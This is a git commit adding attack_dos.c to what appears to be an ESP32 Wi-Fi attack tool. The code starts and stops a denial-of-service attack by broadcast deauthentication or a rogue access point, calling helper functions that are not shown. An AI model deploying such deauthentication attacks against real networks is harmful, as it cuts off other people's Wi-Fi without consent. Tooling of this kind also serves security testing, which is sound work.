290df814920f620c5a69a5480135e58219420633
risinek <risinek@gmail.com>
2021-04-07 22:10:44 +0200

    added deauth DoS attack logic

---
+++ main/attack_dos.c
@@ -0,0 +1,52 @@
+/**
+ * @file attack_dos.c
+ * @author risinek (risinek@gmail.com)
+ * @date 2021-04-07
+ * @copyright Copyright (c) 2021
+ * 
+ * @brief Implements DoS attacks using deauthentication methods
+ */
+#include "attack_dos.h"
+
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+
+#include "attack.h"
+#include "attack_method.h"
+#include "wifi_controller.h"
+
+static const char *TAG = "main:attack_dos";
+static attack_dos_methods_t method = -1;
+
+void attack_dos_start(attack_config_t *attack_config) {
+    ESP_LOGI(TAG, "Starting DoS attack...");
+    method = attack_config->method;
+    switch(method){
+        case ATTACK_DOS_METHOD_BROADCAST:
+            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
+            attack_method_broadcast(attack_config->ap_record, 1);
+            break;
+        case ATTACK_DOS_METHOD_ROGUE_AP:
+            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
+            attack_method_rogueap(attack_config->ap_record);
+            break;
+        default:
+            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
+    }
+}
+
+void attack_dos_stop() {
+    switch(method){
+        case ATTACK_DOS_METHOD_BROADCAST:
+            attack_method_broadcast_stop();
+            break;
+        case ATTACK_DOS_METHOD_ROGUE_AP:
+            wifictl_mgmt_ap_start();
+            wifictl_restore_ap_mac();
+            break;
+        default:
+            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
+    }
+    ESP_LOGI(TAG, "DoS attack stopped");
+}
